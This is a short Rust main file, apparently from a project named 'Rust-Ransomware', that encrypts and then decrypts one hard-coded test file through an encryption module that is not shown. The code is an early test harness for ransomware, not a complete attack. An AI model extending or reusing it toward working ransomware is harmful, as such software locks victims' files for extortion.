#[cfg(windows)]
extern crate winapi;

mod encryption;
mod lib;
use encryption::{decrypt, encrypt, generate_key};
use std::ffi::CString;
fn main() {
    encrypt(
        CString::new(
            "C:\\Users\\chuon\\OneDrive\\Desktop\\Rust-Ransomware\\testing_ransom\\yeet.txt",
        )
        .unwrap(),
        CString::new(
            "C:\\Users\\chuon\\OneDrive\\Desktop\\Rust-Ransomware\\testing_ransom\\yeet_encrypted.txt",
        )
        .unwrap(),
    );

    decrypt(
        CString::new(
            "C:\\Users\\chuon\\OneDrive\\Desktop\\Rust-Ransomware\\testing_ransom\\yeet_encrypted.txt",
        )
        .unwrap(),
        CString::new(
            "C:\\Users\\chuon\\OneDrive\\Desktop\\Rust-Ransomware\\testing_ransom\\yeet_decrypted.txt",
        )
        .unwrap(),
    );
}
